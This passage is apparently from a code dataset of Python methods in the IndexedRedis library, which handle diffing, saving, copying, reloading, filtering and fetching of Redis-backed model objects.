            "def diff(firstObj, otherObj, includeMeta=False):\n\t\t'''\n\t\t\tdiff - Compare the field values on two IndexedRedisModels.\n\n\t\t\t@param firstObj <IndexedRedisModel instance> - First object (or self)\n\n\t\t\t@param otherObj <IndexedRedisModel instance> - Second object\n\n\t\t\t@param includeMeta <bool> - If meta information (like pk) should be in the diff results.\n\n\n\t\t\t@return <dict> - Dict of  'field' : ( value_firstObjForField, value_otherObjForField ).\n\t\t\t\t\n\t\t\t\tKeys are names of fields with different values.\n\t\t\t\tValue is a tuple of ( value_firstObjForField, value_otherObjForField )\n\n\t\t\tCan be called statically, like: IndexedRedisModel.diff ( obj1, obj2 )\n\n\t\t\t  or in reference to an obj   : obj1.diff(obj2)\n\t\t'''\n\n\t\tif not isIndexedRedisModel(firstObj):\t\n\t\t\traise ValueError('Type < %s > does not extend IndexedRedisModel.' %( type(firstObj).__name__ , ) )\n\t\tif not isIndexedRedisModel(otherObj):\t\n\t\t\traise ValueError('Type < %s > does not extend IndexedRedisModel.' %( type(otherObj).__name__ , ) )\n\n\t\tfirstObj.validateModel()\n\t\totherObj.validateModel()\n\n\t\t# Types may not match, but could be subclass, special copy class (like connectAlt), etc.\n\t\t#   So check if FIELDS matches, and if so, we can continue.\n\t\tif getattr(firstObj, 'FIELDS') != getattr(otherObj, 'FIELDS'):\n\t\t\t# NOTE: Maybe we should iterate here and compare just that field types and names match?\n\t\t\t#   In case a copy changes a default or something, we would still be able to diff..\n\t\t\traise ValueError('Cannot compare  < %s > and < %s > . Must be same model OR have equal FIELDS.' %( firstObj.__class__, otherObj.__class__) )\n\t\t\n\t\tdiffFields = {}\n\n\t\tfor thisField in firstObj.FIELDS:\n\n\t\t\tthisFieldStr = str(thisField)\n\n\t\t\tfirstVal = object.__getattribute__( firstObj, thisFieldStr )\n\t\t\totherVal = object.__getattribute__( otherObj, thisFieldStr )\n\n\t\t\tif firstVal != otherVal:\n\t\t\t\tdiffFields[ thisFieldStr ] = ( (firstVal, otherVal) )\n\n\t\tif includeMeta:\n\t\t\tfirstPk = firstObj.getPk()\n\t\t\totherPk = otherObj.getPk()\n\t\t\tif firstPk != otherPk:\n\t\t\t\tdiffFields['_id'] = ( firstPk, otherPk )\n\n\t\treturn diffFields"
        ],
        [
            "def save(self, cascadeSave=True):\n\t\t'''\n\t\t\tsave - Save this object.\n\t\t\t\n\t\t\tWill perform an \"insert\" if this object had not been saved before,\n\t\t\t  otherwise will update JUST the fields changed on THIS INSTANCE of the model.\n\n\t\t\t  i.e. If you have two processes fetch the same object and change different fields, they will not overwrite\n\t\t\t  eachother, but only save the ones each process changed.\n\n\t\t\tIf you want to save multiple objects of type MyModel in a single transaction,\n\t\t\tand you have those objects in a list, myObjs, you can do the following:\n\n\t\t\t\tMyModel.saver.save(myObjs)\n\n\t\t\t@param cascadeSave <bool> Default True - If True, any Foreign models linked as attributes that have been altered\n\t\t\t   or created will be saved with this object. If False, only this object (and the reference to an already-saved foreign model) will be saved.\n\n\t\t\t@see #IndexedRedisSave.save\n\n\t\t\t@return <list> - Single element list, id of saved object (if successful)\n\t\t'''\n\t\tsaver = IndexedRedisSave(self.__class__)\n\t\treturn saver.save(self, cascadeSave=cascadeSave)"
        ],
        [
            "def hasSameValues(self, other, cascadeObject=True):\n\t\t'''\n\t\t\thasSameValues - Check if this and another model have the same fields and values.\n\n\t\t\tThis does NOT include id, so the models can have the same values but be different objects in the database.\n\n\t\t\t@param other <IndexedRedisModel> - Another model\n\n\t\t\t@param cascadeObject <bool> default True - If True, foreign link values with changes will be considered a difference.\n\t\t\t\tOtherwise, only the immediate values are checked.\n\n\t\t\t@return <bool> - True if all fields have the same value, otherwise False\n\t\t'''\n\t\tif self.FIELDS != other.FIELDS:\n\t\t\treturn False\n\n\t\toga = object.__getattribute__\n\n\t\tfor field in self.FIELDS:\n\t\t\tthisVal = oga(self, field)\n\t\t\totherVal = oga(other, field)\n\t\t\tif thisVal != otherVal:\n\t\t\t\treturn False\n\n\t\t\tif cascadeObject is True and issubclass(field.__class__, IRForeignLinkFieldBase):\n\t\t\t\tif thisVal and thisVal.isFetched():\n\t\t\t\t\tif otherVal and otherVal.isFetched():\n\t\t\t\t\t\ttheseForeign = thisVal.getObjs()\n\t\t\t\t\t\tothersForeign = otherVal.getObjs()\n\t\t\t\t\t\t \n\t\t\t\t\t\tfor i in range(len(theseForeign)):\n\t\t\t\t\t\t\tif not theseForeign[i].hasSameValues(othersForeign[i]):\n\t\t\t\t\t\t\t\treturn False\n\t\t\t\t\telse:\n\t\t\t\t\t\ttheseForeign = thisVal.getObjs()\n\n\t\t\t\t\t\tfor i in range(len(theseForeign)):\n\t\t\t\t\t\t\tif theseForeign[i].hasUnsavedChanges(cascadeObjects=True):\n\t\t\t\t\t\t\t\treturn False\n\t\t\t\telse:\n\t\t\t\t\tif otherVal and otherVal.isFetched():\n\t\t\t\t\t\tothersForeign = otherVal.getObjs()\n\n\t\t\t\t\t\tfor i in range(len(othersForeign)):\n\t\t\t\t\t\t\tif othersForeign[i].hasUnsavedChanges(cascadeObjects=True):\n\t\t\t\t\t\t\t\treturn False\n\n\t\t\t\t\t\t\t\n\t\t\t\t\n\n\t\treturn True"
        ],
        [
            "def copy(self, copyPrimaryKey=False, copyValues=False):\n\t\t'''\n                    copy - Copies this object.\n\n                    @param copyPrimaryKey <bool> default False - If True, any changes to the copy will save over-top the existing entry in Redis.\n                        If False, only the data is copied, and nothing is saved.\n\n\t\t    @param copyValues <bool> default False - If True, every field value on this object will be explicitly copied. If False,\n\t\t      an object will be created with the same values, and depending on the type may share the same reference.\n\t\t      \n\t\t      This is the difference between a copy and a deepcopy.\n\n\t            @return <IndexedRedisModel> - Copy of this object, per above\n\n\t\t    If you need a copy that IS linked, @see IndexedRedisModel.copy\n\t\t'''\n\t\tcpy = self.__class__(**self.asDict(copyPrimaryKey, forStorage=False))\n\t\tif copyValues is True:\n\t\t\tfor fieldName in cpy.FIELDS:\n\t\t\t\tsetattr(cpy, fieldName, copy.deepcopy(getattr(cpy, fieldName)))\n\t\treturn cpy"
        ],
        [
            "def saveToExternal(self, redisCon):\n\t\t'''\n\t\t\tsaveToExternal - Saves this object to a different Redis than that specified by REDIS_CONNECTION_PARAMS on this model.\n\n\t\t\t@param redisCon <dict/redis.Redis> - Either a dict of connection params, a la REDIS_CONNECTION_PARAMS, or an existing Redis connection.\n\t\t\t\tIf you are doing a lot of bulk copies, it is recommended that you create a Redis connection and pass it in rather than establish a new\n\t\t\t\tconnection with each call.\n\n\t\t\t@note - You will generate a new primary key relative to the external Redis environment. If you need to reference a \"shared\" primary key, it is better\n\t\t\t\t\tto use an indexed field than the internal pk.\n\n\t\t'''\n\t\tif type(redisCon) == dict:\n\t\t\tconn = redis.Redis(**redisCon)\n\t\telif hasattr(conn, '__class__') and issubclass(conn.__class__, redis.Redis):\n\t\t\tconn = redisCon\n\t\telse:\n\t\t\traise ValueError('saveToExternal \"redisCon\" param must either be a dictionary of connection parameters, or redis.Redis, or extension thereof')\n\n\t\tsaver = self.saver\n\n\t\t# Fetch next PK from external\n\t\tforceID = saver._getNextID(conn) # Redundant because of changes in save method\n\t\tmyCopy = self.copy(False)\n\n\t\treturn saver.save(myCopy, usePipeline=True, forceID=forceID, conn=conn)"
        ],
        [
            "def reload(self, cascadeObjects=True):\n\t\t'''\n                reload - Reload this object from the database, overriding any local changes and merging in any updates.\n\n\n\t\t    @param cascadeObjects <bool> Default True. If True, foreign-linked objects will be reloaded if their values have changed\n\t\t      since last save/fetch. If False, only if the pk changed will the foreign linked objects be reloaded.\n\n                    @raises KeyError - if this object has not been saved (no primary key)\n\n                    @return - Dict with the keys that were updated. Key is field name that was updated,\n\t\t       and value is tuple of (old value, new value). \n\n\t\t    NOTE: Currently, this will cause a fetch of all Foreign Link objects, one level\n\n\t\t'''\n\t\t_id = self._id\n\t\tif not _id:\n\t\t\traise KeyError('Object has never been saved! Cannot reload.')\n\n\t\tcurrentData = self.asDict(False, forStorage=False)\n\n\t\t# Get the object, and compare the unconverted \"asDict\" repr.\n\t\t#  If any changes, we will apply the already-convered value from\n\t\t#  the object, but we compare the unconverted values (what's in the DB).\n\t\tnewDataObj = self.objects.get(_id)\n\t\tif not newDataObj:\n\t\t\traise KeyError('Object with id=%d is not in database. Cannot reload.' %(_id,))\n\n\t\tnewData = newDataObj.asDict(False, forStorage=False)\n\t\tif currentData == newData and not self.foreignFields:\n\t\t\treturn []\n\n\t\tupdatedFields = {}\n\t\tfor thisField, newValue in newData.items():\n\t\t\tdefaultValue = thisField.getDefaultValue()\n\n\t\t\tcurrentValue = currentData.get(thisField, defaultValue)\n\n\t\t\tfieldIsUpdated = False\n\n\t\t\tif currentValue != newValue:\n\t\t\t\tfieldIsUpdated = True\n\t\t\telif cascadeObjects is True and issubclass(thisField.__class__, IRForeignLinkFieldBase):\n\t\t\t\t# If we are cascading objects, and at this point the pk is the same\n\n\t\t\t\tif currentValue.isFetched():\n\t\t\t\t\t# If we have fetched the current set, we might need to update (pks already match)\n\t\t\t\t\toldObjs = currentValue.getObjs()\n\t\t\t\t\tnewObjs = newValue.getObjs()\n\n\t\t\t\t\tif oldObjs != newObjs: # This will check using __eq__, so one-level including pk\n\t\t\t\t\t\tfieldIsUpdated = True\n\t\t\t\t\telse:\n\t\t\t\t\t\t# Use hasSameValues with cascadeObjects=True to scan past one level\n\t\t\t\t\t\tfor i in range(len(oldObjs)):\n\t\t\t\t\t\t\tif not oldObjs[i].hasSameValues(newObjs[i], cascadeObjects=True):\n\t\t\t\t\t\t\t\tfieldIsUpdated = True\n\t\t\t\t\t\t\t\tbreak\n\n\t\t\tif fieldIsUpdated is True:\n\t\t\t\t# Use \"converted\" values in the updatedFields dict, and apply on the object.\n\t\t\t\tupdatedFields[thisField] = ( currentValue, newValue) \n\t\t\t\tsetattr(self, thisField, newValue)\n\t\t\t\tself._origData[thisField] = newDataObj._origData[thisField]\n\n\n\t\treturn updatedFields"
        ],
        [
            "def copyModel(mdl):\n\t\t'''\n\t\t\tcopyModel - Copy this model, and return that copy.\n\n\t\t\t  The copied model will have all the same data, but will have a fresh instance of the FIELDS array and all members,\n\t\t\t    and the INDEXED_FIELDS array.\n\t\t\t  \n\t\t\t  This is useful for converting, like changing field types or whatever, where you can load from one model and save into the other.\n\n\t\t\t@return <IndexedRedisModel> - A copy class of this model class with a unique name.\n\t\t'''\n\t\t\t     \n\t\tcopyNum = _modelCopyMap[mdl]\n\t\t_modelCopyMap[mdl] += 1\n\t\tmdlCopy = type(mdl.__name__ + '_Copy' + str(copyNum), mdl.__bases__, copy.deepcopy(dict(mdl.__dict__)))\n\n\t\tmdlCopy.FIELDS = [field.copy() for field in mdl.FIELDS]\n\t\t\n\t\tmdlCopy.INDEXED_FIELDS = [str(idxField) for idxField in mdl.INDEXED_FIELDS] # Make sure they didn't do INDEXED_FIELDS = FIELDS or something wacky,\n\t\t\t\t\t\t\t\t\t\t\t    #  so do a comprehension of str on these to make sure we only get names\n\n\t\tmdlCopy.validateModel()\n\n\t\treturn mdlCopy"
        ],
        [
            "def connectAlt(cls, redisConnectionParams):\n\t\t'''\n\t\t\tconnectAlt - Create a class of this model which will use an alternate connection than the one specified by REDIS_CONNECTION_PARAMS on this model.\n\n\t\t\t@param redisConnectionParams <dict> - Dictionary of arguments to redis.Redis, same as REDIS_CONNECTION_PARAMS.\n\n\t\t\t@return - A class that can be used in all the same ways as the existing IndexedRedisModel, but that connects to a different instance.\n\n\t\t\t  The fields and key will be the same here, but the connection will be different. use #copyModel if you want an independent class for the model\n\t\t'''\n\t\tif not isinstance(redisConnectionParams, dict):\n\t\t\traise ValueError('redisConnectionParams must be a dictionary!')\n\n\t\thashVal = hashDictOneLevel(redisConnectionParams)\n\n\t\tmodelDictCopy = copy.deepcopy(dict(cls.__dict__))\n\t\tmodelDictCopy['REDIS_CONNECTION_PARAMS'] = redisConnectionParams\n\n\t\tConnectedIndexedRedisModel = type('AltConnect' + cls.__name__ + str(hashVal), cls.__bases__, modelDictCopy)\n\n\t\treturn ConnectedIndexedRedisModel"
        ],
        [
            "def _get_new_connection(self):\n\t\t'''\n\t\t\t_get_new_connection - Get a new connection\n\t\t\tinternal\n\t\t'''\n\t\tpool = getRedisPool(self.mdl.REDIS_CONNECTION_PARAMS)\n\t\treturn redis.Redis(connection_pool=pool)"
        ],
        [
            "def _get_connection(self):\n\t\t'''\n\t\t\t_get_connection - Maybe get a new connection, or reuse if passed in.\n\t\t\t\tWill share a connection with a model\n\t\t\tinternal\n\t\t'''\n\t\tif self._connection is None:\n\t\t\tself._connection = self._get_new_connection() \n\t\treturn self._connection"
        ],
        [
            "def _add_id_to_keys(self, pk, conn=None):\n\t\t'''\n\t\t\t_add_id_to_keys - Adds primary key to table\n\t\t\tinternal\n\t\t'''\n\t\tif conn is None:\n\t\t\tconn = self._get_connection()\n\t\tconn.sadd(self._get_ids_key(), pk)"
        ],
        [
            "def _rem_id_from_keys(self, pk, conn=None):\n\t\t'''\n\t\t\t_rem_id_from_keys - Remove primary key from table\n\t\t\tinternal\n\t\t'''\n\t\tif conn is None:\n\t\t\tconn = self._get_connection()\n\t\tconn.srem(self._get_ids_key(), pk)"
        ],
        [
            "def _add_id_to_index(self, indexedField, pk, val, conn=None):\n\t\t'''\n\t\t\t_add_id_to_index - Adds an id to an index\n\t\t\tinternal\n\t\t'''\n\t\tif conn is None:\n\t\t\tconn = self._get_connection()\n\t\tconn.sadd(self._get_key_for_index(indexedField, val), pk)"
        ],
        [
            "def _rem_id_from_index(self, indexedField, pk, val, conn=None):\n\t\t'''\n\t\t\t_rem_id_from_index - Removes an id from an index\n\t\t\tinternal\n\t\t'''\n\t\tif conn is None:\n\t\t\tconn = self._get_connection()\n\t\tconn.srem(self._get_key_for_index(indexedField, val), pk)"
        ],
        [
            "def _get_key_for_index(self, indexedField, val):\n\t\t'''\n\t\t\t_get_key_for_index - Returns the key name that would hold the indexes on a value\n\t\t\tInternal - does not validate that indexedFields is actually indexed. Trusts you. Don't let it down.\n\n\t\t\t@param indexedField - string of field name\n\t\t\t@param val - Value of field\n\n\t\t\t@return - Key name string, potentially hashed.\n\t\t'''\n\t\t# If provided an IRField, use the toIndex from that (to support compat_ methods\n\t\tif hasattr(indexedField, 'toIndex'):\n\t\t\tval = indexedField.toIndex(val)\n\t\telse:\n\t\t# Otherwise, look up the indexed field from the model\n\t\t\tval = self.fields[indexedField].toIndex(val)\n\n\n\t\treturn ''.join( [INDEXED_REDIS_PREFIX, self.keyName, ':idx:', indexedField, ':', val] )"
        ],
        [
            "def _compat_rem_str_id_from_index(self, indexedField, pk, val, conn=None):\n\t\t'''\n\t\t\t_compat_rem_str_id_from_index - Used in compat_convertHashedIndexes to remove the old string repr of a field,\n\t\t\t\tin order to later add the hashed value,\n\t\t'''\n\t\tif conn is None:\n\t\t\tconn = self._get_connection()\n\t\tconn.srem(self._compat_get_str_key_for_index(indexedField, val), pk)"
        ],
        [
            "def _peekNextID(self, conn=None):\n\t\t'''\n\t\t\t_peekNextID - Look at, but don't increment the primary key for this model.\n\t\t\t\tInternal.\n\n\t\t\t@return int - next pk\n\t\t'''\n\t\tif conn is None:\n\t\t\tconn = self._get_connection()\n\t\treturn to_unicode(conn.get(self._get_next_id_key()) or 0)"
        ],
        [
            "def _filter(filterObj, **kwargs):\n\t\t'''\n\t\t\tInternal for handling filters; the guts of .filter and .filterInline\n\t\t'''\n\t\tfor key, value in kwargs.items():\n\t\t\tif key.endswith('__ne'):\n\t\t\t\tnotFilter = True\n\t\t\t\tkey = key[:-4]\n\t\t\telse:\n\t\t\t\tnotFilter = False\n\t\t\tif key not in filterObj.indexedFields:\n\t\t\t\traise ValueError('Field \"' + key + '\" is not in INDEXED_FIELDS array. Filtering is only supported on indexed fields.')\n\n\t\t\tif notFilter is False:\n\t\t\t\tfilterObj.filters.append( (key, value) )\n\t\t\telse:\n\t\t\t\tfilterObj.notFilters.append( (key, value) )\n\n\t\treturn filterObj"
        ],
        [
            "def count(self):\n\t\t'''\n\t\t\tcount - gets the number of records matching the filter criteria\n\n\t\t\tExample:\n\t\t\t\ttheCount = Model.objects.filter(field1='value').count()\n\t\t'''\n\t\tconn = self._get_connection()\n\t\t\n\t\tnumFilters = len(self.filters)\n\t\tnumNotFilters = len(self.notFilters)\n\t\tif numFilters + numNotFilters == 0:\n\t\t\treturn conn.scard(self._get_ids_key())\n\n\t\tif numNotFilters == 0:\n\t\t\tif numFilters == 1:\n\t\t\t\t(filterFieldName, filterValue) = self.filters[0]\n\t\t\t\treturn conn.scard(self._get_key_for_index(filterFieldName, filterValue))\n\t\t\tindexKeys = [self._get_key_for_index(filterFieldName, filterValue) for filterFieldName, filterValue in self.filters]\n\n\t\t\treturn len(conn.sinter(indexKeys))\n\n\t\tnotIndexKeys = [self._get_key_for_index(filterFieldName, filterValue) for filterFieldName, filterValue in self.notFilters]\n\t\tif numFilters == 0:\n\t\t\treturn len(conn.sdiff(self._get_ids_key(), *notIndexKeys))\n\n\t\tindexKeys = [self._get_key_for_index(filterFieldName, filterValue) for filterFieldName, filterValue in self.filters]\n\t\t\n\t\ttempKey = self._getTempKey()\n\t\tpipeline = conn.pipeline()\n\t\tpipeline.sinterstore(tempKey, *indexKeys)\n\t\tpipeline.sdiff(tempKey, *notIndexKeys)\n\t\tpipeline.delete(tempKey)\n\t\tpks = pipeline.execute()[1] # sdiff\n\n\t\treturn len(pks)"
        ],
        [
            "def exists(self, pk):\n\t\t'''\n\t\t\texists - Tests whether a record holding the given primary key exists.\n\n\t\t\t@param pk - Primary key (see getPk method)\n\n\t\t\tExample usage: Waiting for an object to be deleted without fetching the object or running a filter. \n\n\t\t\tThis is a very cheap operation.\n\n\t\t\t@return <bool> - True if object with given pk exists, otherwise False\n\t\t'''\n\t\tconn = self._get_connection()\n\t\tkey = self._get_key_for_id(pk)\n\t\treturn conn.exists(key)"
        ],
        [
            "def getPrimaryKeys(self, sortByAge=False):\n\t\t'''\n\t\t\tgetPrimaryKeys - Returns all primary keys matching current filterset.\n\n\t\t\t@param sortByAge <bool> - If False, return will be a set and may not be ordered.\n\t\t\t\tIf True, return will be a list and is guarenteed to represent objects oldest->newest\n\n\t\t\t@return <set> - A set of all primary keys associated with current filters.\n\t\t'''\n\t\tconn = self._get_connection()\n\t\t# Apply filters, and return object\n\t\tnumFilters = len(self.filters)\n\t\tnumNotFilters = len(self.notFilters)\n\n\t\tif numFilters + numNotFilters == 0:\n\t\t\t# No filters, get all.\n\t\t\tconn = self._get_connection()\n\t\t\tmatchedKeys = conn.smembers(self._get_ids_key())\n\n\t\telif numNotFilters == 0:\n\t\t\t# Only Inclusive\n\t\t\tif numFilters == 1:\n\t\t\t\t# Only one filter, get members of that index key\n\t\t\t\t(filterFieldName, filterValue) = self.filters[0]\n\t\t\t\tmatchedKeys = conn.smembers(self._get_key_for_index(filterFieldName, filterValue))\n\t\t\telse:\n\t\t\t\t# Several filters, intersect the index keys\n\t\t\t\tindexKeys = [self._get_key_for_index(filterFieldName, filterValue) for filterFieldName, filterValue in self.filters]\n\t\t\t\tmatchedKeys = conn.sinter(indexKeys)\n\n\t\telse:\n\t\t\t# Some negative filters present\n\t\t\tnotIndexKeys = [self._get_key_for_index(filterFieldName, filterValue) for filterFieldName, filterValue in self.notFilters]\n\t\t\tif numFilters == 0:\n\t\t\t\t# Only negative, diff against all keys\n\t\t\t\tmatchedKeys = conn.sdiff(self._get_ids_key(), *notIndexKeys)\n\t\t\telse:\n\t\t\t\t# Negative and positive. Use pipeline, find all positive intersections, and remove negative matches\n\t\t\t\tindexKeys = [self._get_key_for_index(filterFieldName, filterValue) for filterFieldName, filterValue in self.filters]\n\t\t\t\t\n\t\t\t\ttempKey = self._getTempKey()\n\t\t\t\tpipeline = conn.pipeline()\n\t\t\t\tpipeline.sinterstore(tempKey, *indexKeys)\n\t\t\t\tpipeline.sdiff(tempKey, *notIndexKeys)\n\t\t\t\tpipeline.delete(tempKey)\n\t\t\t\tmatchedKeys = pipeline.execute()[1] # sdiff\n\n\n\t\tmatchedKeys = [ int(_key) for _key in matchedKeys ]\n\n\t\tif sortByAge is False:\n\t\t\treturn list(matchedKeys)\n\t\telse:\n\t\t\tmatchedKeys = list(matchedKeys)\n\t\t\tmatchedKeys.sort()\n\n\t\t\treturn matchedKeys"
        ],
        [
            "def all(self, cascadeFetch=False):\n\t\t'''\n\t\t\tall - Get the underlying objects which match the filter criteria.\n\n\t\t\tExample:   objs = Model.objects.filter(field1='value', field2='value2').all()\n\n\t\t\t@param cascadeFetch <bool> Default False, If True, all Foreign objects associated with this model\n\t\t\t   will be fetched immediately. If False, foreign objects will be fetched on-access.\n\n\t\t\t@return - Objects of the Model instance associated with this query.\n\t\t'''\n\t\tmatchedKeys = self.getPrimaryKeys()\n\t\tif matchedKeys:\n\t\t\treturn self.getMultiple(matchedKeys, cascadeFetch=cascadeFetch)\n\n\t\treturn IRQueryableList([], mdl=self.mdl)"
        ],
        [
            "def allOnlyFields(self, fields, cascadeFetch=False):\n\t\t'''\n\t\t\tallOnlyFields - Get the objects which match the filter criteria, only fetching given fields.\n\n\t\t\t@param fields - List of fields to fetch\n\n\t\t\t@param cascadeFetch <bool> Default False, If True, all Foreign objects associated with this model\n\t\t\t   will be fetched immediately. If False, foreign objects will be fetched on-access.\n\n\n\t\t\t@return - Partial objects with only the given fields fetched\n\t\t'''\n\t\tmatchedKeys = self.getPrimaryKeys()\n\t\tif matchedKeys:\n\t\t\treturn self.getMultipleOnlyFields(matchedKeys, fields, cascadeFetch=cascadeFetch)\n\n\t\treturn IRQueryableList([], mdl=self.mdl)"
        ],
        [
            "def allOnlyIndexedFields(self):\n\t\t'''\n\t\t\tallOnlyIndexedFields - Get the objects which match the filter criteria, only fetching indexed fields.\n\n\t\t\t@return - Partial objects with only the indexed fields fetched\n\t\t'''\n\t\tmatchedKeys = self.getPrimaryKeys()\n\t\tif matchedKeys:\n\t\t\treturn self.getMultipleOnlyIndexedFields(matchedKeys)\n\n\t\treturn IRQueryableList([], mdl=self.mdl)"
        ],
        [
            "def random(self, cascadeFetch=False):\n\t\t'''\n\t\t\tRandom - Returns a random record in current filterset.\n\n\n\t\t\t@param cascadeFetch <bool> Default False, If True, all Foreign objects associated with this model\n\t\t\t   will be fetched immediately. If False, foreign objects will be fetched on-access.\n\n\t\t\t@return - Instance of Model object, or None if no items math current filters\n\t\t'''\n\t\tmatchedKeys = list(self.getPrimaryKeys())\n\t\tobj = None\n\t\t# Loop so we don't return None when there are items, if item is deleted between getting key and getting obj\n\t\twhile matchedKeys and not obj:\n\t\t\tkey = matchedKeys.pop(random.randint(0, len(matchedKeys)-1))\n\t\t\tobj = self.get(key, cascadeFetch=cascadeFetch)\n\n\t\treturn obj"
        ],
        [
            "def delete(self):\n\t\t'''\n\t\t\tdelete - Deletes all entries matching the filter criteria\n\n\t\t'''\n\t\tif self.filters or self.notFilters:\n\t\t\treturn self.mdl.deleter.deleteMultiple(self.allOnlyIndexedFields())\n\t\treturn self.mdl.deleter.destroyModel()"
        ],
        [
            "def get(self, pk, cascadeFetch=False):\n\t\t'''\n\t\t\tget - Get a single value with the internal primary key.\n\n\n\t\t\t@param cascadeFetch <bool> Default False, If True, all Foreign objects associated with this model\n\t\t\t   will be fetched immediately. If False, foreign objects will be fetched on-access.\n\n\t\t\t@param pk - internal primary key (can be found via .getPk() on an item)\n\t\t'''\n\t\tconn = self._get_connection()\n\t\tkey = self._get_key_for_id(pk)\n\t\tres = conn.hgetall(key)\n\t\tif type(res) != dict or not len(res.keys()):\n\t\t\treturn None\n\t\tres['_id'] = pk\n\n\t\tret = self._redisResultToObj(res)\n\t\tif cascadeFetch is True:\n\t\t\tself._doCascadeFetch(ret)\n\t\treturn ret"
        ],
        [
            "def _doCascadeFetch(obj):\n\t\t'''\n\t\t\t_doCascadeFetch - Takes an object and performs a cascading fetch on all foreign links, and all theirs, and so on.\n\n\t\t\t@param obj <IndexedRedisModel> - A fetched model\n\t\t'''\n\t\tobj.validateModel()\n\n\t\tif not obj.foreignFields:\n\t\t\treturn\n\n\t\t  # NOTE: Currently this fetches using one transaction per object. Implementation for actual resolution is in\n\t\t  #   IndexedRedisModel.__getattribute__ \n\n\t\tfor foreignField in obj.foreignFields:\n\t\t\tsubObjsData = object.__getattribute__(obj, foreignField)\n\t\t\tif not subObjsData:\n\t\t\t\tsetattr(obj, str(foreignField), irNull)\n\t\t\t\tcontinue\n\t\t\tsubObjs = subObjsData.getObjs()\n\t\t\t\n\t\t\tfor subObj in subObjs:\n\t\t\t\tif isIndexedRedisModel(subObj):\n\t\t\t\t\tIndexedRedisQuery._doCascadeFetch(subObj)"
        ],
        [
            "def getMultiple(self, pks, cascadeFetch=False):\n\t\t'''\n\t\t\tgetMultiple - Gets multiple objects with a single atomic operation\n\n\n\t\t\t@param cascadeFetch <bool> Default False, If True, all Foreign objects associated with this model\n\t\t\t   will be fetched immediately. If False, foreign objects will be fetched on-access.\n\n\t\t\t@param pks - list of internal keys\n\t\t'''\n\n\t\tif type(pks) == set:\n\t\t\tpks = list(pks)\n\n\t\tif len(pks) == 1:\n\t\t\t# Optimization to not pipeline on 1 id\n\t\t\treturn IRQueryableList([self.get(pks[0], cascadeFetch=cascadeFetch)], mdl=self.mdl)\n\n\t\tconn = self._get_connection()\n\t\tpipeline = conn.pipeline()\n\t\tfor pk in pks:\n\t\t\tkey = self._get_key_for_id(pk)\n\t\t\tpipeline.hgetall(key)\n\n\t\tres = pipeline.execute()\n\t\t\n\t\tret = IRQueryableList(mdl=self.mdl)\n\t\ti = 0\n\t\tpksLen = len(pks)\n\t\twhile i < pksLen:\n\t\t\tif res[i] is None:\n\t\t\t\tret.append(None)\n\t\t\t\ti += 1\n\t\t\t\tcontinue\n\t\t\tres[i]['_id'] = pks[i]\n\t\t\tobj = self._redisResultToObj(res[i])\n\t\t\tret.append(obj)\n\t\t\ti += 1\n\n\t\tif cascadeFetch is True:\n\t\t\tfor obj in ret:\n\t\t\t\tif not obj:\n\t\t\t\t\tcontinue\n\t\t\t\tself._doCascadeFetch(obj)\n\t\t\t\n\t\treturn ret"
        ],
        [
            "def getOnlyFields(self, pk, fields, cascadeFetch=False):\n\t\t'''\n\t\t\tgetOnlyFields - Gets only certain fields from a paticular primary key. For working on entire filter set, see allOnlyFields\n\n\t\t\t@param pk <int> - Primary Key\n\n\t\t\t@param fields list<str> - List of fields\n\n\t\t\t@param cascadeFetch <bool> Default False, If True, all Foreign objects associated with this model\n\t\t\t   will be fetched immediately. If False, foreign objects will be fetched on-access.\n\n\n\t\t\treturn - Partial objects with only fields applied\n\t\t'''\n\t\tconn = self._get_connection()\n\t\tkey = self._get_key_for_id(pk)\n\n\t\tres = conn.hmget(key, fields)\n\t\tif type(res) != list or not len(res):\n\t\t\treturn None\n\n\t\tobjDict = {}\n\t\tnumFields = len(fields)\n\t\ti = 0\n\t\tanyNotNone = False\n\t\twhile i < numFields:\n\t\t\tobjDict[fields[i]] = res[i]\n\t\t\tif res[i] != None:\n\t\t\t\tanyNotNone = True\n\t\t\ti += 1\n\n\t\tif anyNotNone is False:\n\t\t\treturn None\n\t\t\t\n\t\tobjDict['_id'] = pk\n\t\tret = self._redisResultToObj(objDict)\n\t\tif cascadeFetch is True:\n\t\t\tself._doCascadeFetch(ret)\n\n\t\treturn ret"
        ],
        [
            "def getMultipleOnlyFields(self, pks, fields, cascadeFetch=False):\n\t\t'''\n\t\t\tgetMultipleOnlyFields - Gets only certain fields from a list of  primary keys. For working on entire filter set, see allOnlyFields\n\n\t\t\t@param pks list<str> - Primary Keys\n\n\t\t\t@param fields list<str> - List of fields\n\n\n\t\t\t@param cascadeFetch <bool> Default False, If True, all Foreign objects associated with this model\n\t\t\t   will be fetched immediately. If False, foreign objects will be fetched on-access.\n\n\t\t\treturn - List of partial objects with only fields applied\n\t\t'''\n\t\tif type(pks) == set:\n\t\t\tpks = list(pks)\n\n\t\tif len(pks) == 1:\n\t\t\treturn IRQueryableList([self.getOnlyFields(pks[0], fields, cascadeFetch=cascadeFetch)], mdl=self.mdl)\n\n\t\tconn = self._get_connection()\n\t\tpipeline = conn.pipeline()\n\n\t\tfor pk in pks:\n\t\t\tkey = self._get_key_for_id(pk)\n\t\t\tpipeline.hmget(key, fields)\n\n\t\tres = pipeline.execute()\n\t\tret = IRQueryableList(mdl=self.mdl)\n\t\tpksLen = len(pks)\n\t\ti = 0\n\t\tnumFields = len(fields)\n\t\twhile i < pksLen:\n\t\t\tobjDict = {}\n\t\t\tanyNotNone = False\n\t\t\tthisRes = res[i]\n\t\t\tif thisRes is None or type(thisRes) != list:\n\t\t\t\tret.append(None)\n\t\t\t\ti += 1\n\t\t\t\tcontinue\n\n\t\t\tj = 0\n\t\t\twhile j < numFields:\n\t\t\t\tobjDict[fields[j]] = thisRes[j]\n\t\t\t\tif thisRes[j] != None:\n\t\t\t\t\tanyNotNone = True\n\t\t\t\tj += 1\n\n\t\t\tif anyNotNone is False:\n\t\t\t\tret.append(None)\n\t\t\t\ti += 1\n\t\t\t\tcontinue\n\n\t\t\tobjDict['_id'] = pks[i]\n\t\t\tobj = self._redisResultToObj(objDict)\n\t\t\tret.append(obj)\n\t\t\ti += 1\n\n\t\tif cascadeFetch is True:\n\t\t\tfor obj in ret:\n\t\t\t\tself._doCascadeFetch(obj)\n\t\t\t\n\t\treturn ret"
        ],
        [
